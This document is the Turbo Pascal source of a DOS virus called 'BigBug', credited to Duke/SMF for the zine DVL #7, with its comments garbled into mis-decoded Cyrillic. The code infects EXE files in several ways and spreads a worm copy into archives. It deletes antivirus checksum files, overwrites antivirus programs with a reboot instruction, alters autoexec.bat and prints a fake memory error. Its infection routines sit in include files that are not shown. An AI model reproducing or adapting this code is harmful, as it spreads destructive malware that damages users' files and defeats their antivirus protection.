   {$M 10000, 3000, 10000}
   program BigBug_Virus;
   uses dos,crt;
   const len = 8820;                {¤«¨  ¢¨àãá }
         MPos = 200;                {¯®§¨æ¨ï ¬¥âª¨ ¢ ä ©«¥}
         metka:byte = $AE;          {¡ ©â   ¬¥áâ¥ ¬¥âª¨}
         VS = 16;                   {ª®«¨ç¥áâ¢® áâà®ª ¢ «®£®â¨¯¥}
         logo:array[1..VS] of string[80] = (

   '   ÛÛÛÛÛÛÛÛÛÜ                        ÛÛÛÛÛÛÛÛÛÜ                                ',
   '   ÛÛ      ßÛÛ                       ÛÛ      ßÛÛ                               ',
   '   ÛÛ       ÛÛ   ÛÛ     ÜÛÛÛÛÛÛÛÜ    ÛÛ       ÛÛ   ÛÛ       ÛÛ     ÜÛÛÛÛÛÛÛÜ   ',
   '   ÛÛ      ÜÛÛ         ÛÛÛß   ßÛÛÛ   ÛÛ      ÜÛÛ   ÛÛ       ÛÛ    ÛÛÛß   ßÛÛÛ  ',
   '   ÛÛÛÛÛÛÛÛÛ     ÛÛ   ÛÛß            ÛÛÛÛÛÛÛÛÛ     ÛÛ       ÛÛ   ÛÛß           ',
   '   ÛÛ      ßÛÛ   ÛÛ   ÛÛ             ÛÛ      ßÛÛ   ÛÛ       ÛÛ   ÛÛ            ',
   '   ÛÛ       ÛÛ   ÛÛ   ÛÛ      ÛÛÛÛ   ÛÛ       ÛÛ   ÛÛ       ÛÛ   ÛÛ      ÛÛÛÛ  ',
   '   ÛÛ      ÜÛÛ   ÛÛ    ÛÛÜ      ÛÛ   ÛÛ      ÜÛÛ   ÛÛÜ     ÜÛÛ    ÛÛÜ      ÛÛ  ',
   '   ÛÛÛÛÛÛÛÛÛß    ÛÛ     ÛÛÛÛÛÛÛÛß    ÛÛÛÛÛÛÛÛÛß     ÛÛÛÛÛÛÛÛß      ÛÛÛÛÛÛÛÛß   ',
   '                                                                               ',
   '                                                                               ',
   ' ÛÛ      ÛÛ    ÜÛÛÛÛÜ     ÜÛÛÛÛÛÛ     ÛÛ    ÛÛ   ÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÜ    ÛÛÛÛÛÛÛÛ',
   ' ÛÛ      ÛÛ   ÛÛ    ÛÛ   ÛÛ           ÛÛ    ÛÛ   ÛÛ         ÛÛ    ÛÛ   ÛÛ      ',
   ' ÛÛ  ÛÛ  ÛÛ   ÛÛÛÛÛÛÛÛ    ßÛÛÛÛÜ      ÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛ     ÛÛÛÛÛÛÜ    ÛÛÛÛÛÛ  ',
   ' ÛÛ  ÛÛ  ÛÛ   ÛÛ    ÛÛ         ÛÛ     ÛÛ    ÛÛ   ÛÛ         ÛÛ   ßÛÜ   ÛÛ      ',
   '  ßÛÛßßÛÛß    ÛÛ    ÛÛ   ÛÛÛÛÛÛß      ÛÛ    ÛÛ   ÛÛÛÛÛÛÛÛ   ÛÛ    ÛÛ   ÛÛÛÛÛÛÛÛ');

   var f:file;                      {ä ©« á ¢¨àãá®¬}
       g:file;
       t:text;
       body:array[1..len] of byte;  {â¥«® ¢¨àãá }
       host:array[1..len] of byte;  {ªãá®ª â¥«  HLLP-¦¥àâ¢ë}
       a,b:byte;
       WeNowIn:byte;                {¢ ª ª®¬ ¬ë á¥©ç á ä ©«¥}
       WormType:byte;               {â¨¯ á®§¤ ¢ ¥¬ëå ç¥à¢¥©: 0-ä ©«,1- àå¨¢ë}
       archive:boolean;             {¯à¨§ ª â®£®, çâ®  è«¨  àå¨¢}
       ds:dirstr;
       ns:namestr;
       es:extstr;
       par:string;                  {¯ à ¬¥âàë § ¯ãáª }
       companio:string;             {¨¬ï ä ©« , ¯®à ¦¥®£® ª®¬¯ ì®®¬}
       NewName:string;              {¨¬ï á®§¤ ¢ ¥¬®£® ç¥à¢ï}
       Command:string;              {áâà®ª  ¯®¤ COMSPEC}
       i:integer;
       attr:word;                   { âà¨¡ãâë ä ©« }
       ComFind:boolean;             {¤«ï ¯®à ¦ ¥¬®£® EXE  ©¤¥ ®¤®¨¬¥ë© COM}
       Directory:byte;              {¢«®¦¥®áâì ¤¨à¥ªâ®à¨©}
   {$I hllw.inc}
   {$I hllcop.inc}
   {----------------------------------------------------------------------------}
   function UpStr(st:string):string;
   var d:string;
       i:byte;
   begin
   d:='';
   for i:=1 to length(st) do d:=d+upcase(st[i]);
   UpStr:=d;
   end;
   {-------------------------------------------------------------------------}
   function CheckInfection(st:string):boolean;
   var f:file;
       a:byte;
   label Next;
   begin
   ComFind:=false;
   CheckInfection:=false;
   assign(f,st);reset(f,1);
   if filesize(f)<len then begin close(f);goto Next;end;
   seek(f,MPos);
   blockread(f,a,1);
   if a=metka then CheckInfection:=true;
   close(f);
   Next:
   fsplit(st,ds,ns,es);
   assign(f,ds+ns+'.COM');
   {$I-}reset(f,1);{$I+}
   if ioresult=0 then
     begin
     ComFind:=true;
     if filesize(f)<len then begin close(f);exit;end;
     seek(f,MPos);
     blockread(f,a,1);
     if a=metka then CheckInfection:=true;
     close(f);
     end;
   end;
   {-------------------------------------------------------------------------}
   procedure ScanDir(Dir:string);
   const kill:array[1..15] of string[12] =
         ('CHKLIST.CPS',
         'CHKLIST.MS',
         'CHKLIST.TAV',
         'ANTI-VIR.DAT',
         'ANTIVIR.DAT',
         'CRC.DAT',
         'AV.CRC',
         'AVP.CRC',
         'MSAV.CHK',
         'SMARTCHK.CPS',
         'CRC.SVS',
         'CRC_.SVS',
         'TBUTIL.DAT',
         'BOOT.MS',
         'BOOT.NTZ');
         reboot:array[1..2] of byte = ($CD,$18); {¯¥à¥§ £àã§ç¨ª}
   var i:byte;
       f:file;
       s:searchrec;
       z:string;
       fn:string;           {¨¬ï á ¤¨à¥ªâ®à¨¥©}
       p:string;            {¯ à ¬¥âàë § ¯¨á¨ ¢  àå¨¢}
   label NextFile;
   begin
   findfirst(Dir+'*.*',$3f,s);
   while doserror=0 do
     begin
   {  writeln(s.name); }
     archive:=false;
     if copy(s.name,1,1)='.' then goto NextFile;
     if ((s.attr and $10)<>0) and (Directory=0) then
       begin
       Directory:=1;
       ScanDir(s.name+'\');
       Directory:=0;
       goto NextFile;
       end;
     z:=UpStr(s.name);
     fn:=Dir+s.name;
     for i:=1 to 15 do if pos(kill[i],z)<>0 then
       begin
       assign(f,fn);
       erase(f);
       goto NextFile;
       end;
     fsplit(z,ds,ns,es);
     if es='.EXE' then
       begin
       if (pos('ADINF',z)<>0) or (pos('AVP',z)<>0) or (pos('DRWEB',z)<>0) then
         begin
         assign(f,fn);
         setfattr(f,$20);
         reset(f,1);
         blockwrite(f,reboot,2);
         close(f);
         goto NextFile;
         end;
       CheckInfection(fn);
       case s.size of
            0..2700  : Infect_HLLO(fn);
         2701..len-1 : Infect_HLLC(fn);
         else begin
              if ComFind=true then i:=random(2)+1 else i:=random(3);
              case i of
                0 : Infect_HLLC(fn);
                1 : Infect_HLLO(fn);
                2 : Infect_HLLP(fn);
              end;
              end;
       end;
       goto NextFile;
       end;
       if (Directory=0) and (WormType=1) then
         begin
         if (es='RAR') or (es='ZIP') or (es='ARJ') or (es='LZH') then
           begin
           assign(f,s.name);
           getfattr(f,attr);
           setfattr(f,$20);
           MakeWorm('');
           p:='/c ';
           archive:=true;
           end;
         if es='RAR' then p:=p+'rar a -tk -y -c- -o+ ';
         if es='ZIP' then p:=p+'pkzip -a ';
         if es='ARJ' then p:=p+'arj a ';
         if es='LZH' then p:=p+'lha a ';
         if archive=true then
           begin
           p:=p+s.name+' '+NewName+'>nul';
           exec(Command,par); {§ ¯¨áë¢ ¥¬ ¢¨àãá}
           setfattr(f,attr);
           close(f);
           assign(f,NewName);
           erase(f);          {ã¤ «ï¥¬ ¢¨àãá}
           end;
         end;
   NextFile:
     findnext(s);
     end;
   end;
   {-------------------------------------------------------------------------}
   procedure Out(color:integer;st:string); {¢ë¢®¤ à §®æ¢¥â®£® â¥ªáâ }
   var i:byte;
   begin
   textcolor(color);
   for i:=1 to length(st) do
     begin
     write(st[i]);
     sound(400);
     delay(700);
     nosound;
     end;
   end;
   {-------------------------------------------------------------------------}
   procedure BigBug;
   begin
   asm
     mov ah,01h
     mov ch,32
     mov cl,3
     int 10h
   end;
   Out(11,'Hello ! I''m ');
   Out(12,'BigBug ');
   Out(11,'virus, written by ');
   Out(10,'Duke/SMF ');
   Out(11,'special for ');
   Out(13,'DVL #7');
   writeln;
   Out(11,'You can say - ');
   Out(9,'"It''s crazy !!!!"');
   Out(11,'. And you right ');
   Out(10,';-)) ');
   Out(11,'This is very');
   writeln;
   Out(11,'crazy virus. Why my name is ');
   Out(12,'BigBug ');
   Out(11,'? Coz i''m ');
   Out(9,'REALLY ');
   Out(12,'BigBug ');
   Out(11,'!!!!!');
   writeln;
   Out(11,'HLL C/O/P/W in one ! Heheh....');
   textcolor(7);
   writeln(' ');
   asm
     mov ah,01h
     mov ch,7
     mov cl,8
     int 10h
   end;
   halt;
   asm
     db 13,10,'[BigBug] v1.0 (c) by Duke/SMF',13,10
   end;
   end;
   {Hello ! I'm BigBug virus, written by Duke/SMF special for DVL #7}
   {You can say - "It's crazy !!!!". And you right ;-)) This is very}
   {crazy virus. Why my name is BigBug ? Coz i'm REALLY BigBug !!!!!}
   {HLL C/O/P/W in one ! Heheh....                                  }
   {-------------------------------------------------------------------------}
   begin
   {--- ¨¨æ¨¨àã¥¬ random-£¥¥à â®à :}
   Randomize;
   {--- çâ¥¨¥ â¥«  ¢¨àãá  ¨ ¯à®¢¥àª  â¨¯  :}
   assign(f,paramstr(0));reset(f,1);
   blockread(f,body,len);
   if filesize(f)<>len then
     begin
     seek(f,filesize(f)-len);
     blockread(f,a,1);
     blockread(f,b,1);
     if ((a=77) and (b=90)) or ((a=90) and (b=77)) {MZ}
       then WeNowIn:=2 else WeNowIn:=1;
     end
   else
     begin
     fsplit(paramstr(0),ds,ns,es);
     if es='.COM' then
        begin
        companio:=ds+ns+'.EXE';
        assign(g,companio);
        {$I-}reset(g);{$I+}
        if ioresult<>0 then WeNowIn:=3 else begin close(g);WeNowIn:=0;end;
        end
     else WeNowIn:=1;
     end;
   close(f);
   {--- á®§¤ ¨¥ ç¥à¢ï :}
   WormType:=random(2);
   if WormType=0 then Infect_HLLW else Command:=GetEnv('COMSPEC');
   {--- á®åà ¨¥¨¥ ¯ à ¬¥âà®¢ :}
   if (WeNowIn=0) or (WeNowIn=2) then               {¥á«¨ ¬ë HLLC/HLLP}
     begin
     par:='';
     for i:=1 to paramcount do
       if paramstr(i)='BigBug' then BigBug else par:=paramstr(i)+' ';
     end;
   {--- § ¯ãáª ¦¥àâ¢ë :}
   Case WeNowIn of
     0 : Exec_HLLC;
     2 : Exec_HLLP;
     end;
   {--- ¢ë§®¢ ¯®¨áª  ¦¥àâ¢ :}
   Directory:=0;
   ScanDir('');
   {---   § ªãáªã :}
   if random(50)=25 then
     begin
     assign(t,'c:\autoexec.bat');
     setfattr(t,$20);
     append(t);
     writeln(t,'');
     writeln(t,'@type c:\BigBug.txt');
     close(t);
     assign(t,'c:\BigBug.txt');
     rewrite(t);
     for i:=1 to VS do writeln(t,logo[i]);
     close(t);
     end;
   if random(60)=30 then while 1<>2 do write('BigBug! ');
   if (WeNowIn=1) or (WeNowIn=3) then writeln('Not enough memory');
   end.
